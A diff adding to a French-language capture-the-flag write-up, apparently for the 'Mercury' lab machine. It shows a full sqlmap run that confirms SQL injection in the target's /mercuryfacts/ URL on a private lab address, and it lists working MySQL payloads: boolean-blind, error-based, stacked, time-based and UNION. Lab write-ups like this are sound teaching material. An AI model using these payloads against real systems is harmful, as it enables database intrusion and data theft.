@@ -165,3 +165,78 @@ Je pense que je suis en présence d'une possible faille d'injection SQL via cett
 
 Je lance donc une recherche en ce sens : ```http://192.168.56.103:8080/mercuryfacts/1```
 
+C'est confirmé :
+```
+        ___
+       __H__                                                                                                                                                                                                                                
+ ___ ___[)]_____ ___ ___  {1.6#stable}                                                                                                                                                                                                      
+|_ -| . [.]     | .'| . |                                                                                                                                                                                                                   
+|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                   
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:30:06 /2022-01-27/
+
+[09:30:06] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+do you want to try URI injections in the target URL itself? [Y/n/q] 
+[09:30:08] [INFO] testing connection to the target URL
+got a 301 redirect to 'http://192.168.56.103:8080/mercuryfacts/1/'. Do you want to follow? [Y/n] 
+[09:30:11] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+[09:30:11] [INFO] testing if the target URL content is stable
+[09:30:11] [WARNING] URI parameter '#1*' does not appear to be dynamic
+[09:30:13] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
+[09:30:15] [INFO] testing for SQL injection on URI parameter '#1*'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
+[09:30:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[09:30:21] [WARNING] reflective value(s) found and filtering out
+[09:30:23] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[09:30:23] [INFO] testing 'Generic inline queries'
+[09:30:23] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[09:30:23] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[09:30:24] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[09:30:24] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[09:30:24] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[09:30:24] [INFO] URI parameter '#1*' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
+[09:30:24] [INFO] testing 'MySQL inline queries'
+[09:30:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[09:30:24] [WARNING] time-based comparison requires larger statistical model, please wait................ (done)                                                                                                                           
+[09:30:36] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
+[09:30:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[09:30:46] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[09:30:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[09:30:46] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[09:30:46] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[09:30:48] [INFO] target URL appears to have 1 column in query
+[09:30:48] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://192.168.56.103:8080/mercuryfacts/1 AND 6969=6969
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: http://192.168.56.103:8080/mercuryfacts/1 AND GTID_SUBSET(CONCAT(0x716b6a6a71,(SELECT (ELT(4523=4523,1))),0x7170627171),4523)
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: http://192.168.56.103:8080/mercuryfacts/1;SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://192.168.56.103:8080/mercuryfacts/1 AND (SELECT 3813 FROM (SELECT(SLEEP(5)))zGhx)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: http://192.168.56.103:8080/mercuryfacts/1 UNION ALL SELECT CONCAT(0x716b6a6a71,0x6e61717373496646795145727a61796f5572524c474a424c436642434e546c6f4f4d7a4b6e716f4c,0x7170627171)-- -
+---
+[09:30:54] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.6
+[09:30:55] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.56.103'
+
+[*] ending @ 09:30:55 /2022-01-27/
+```
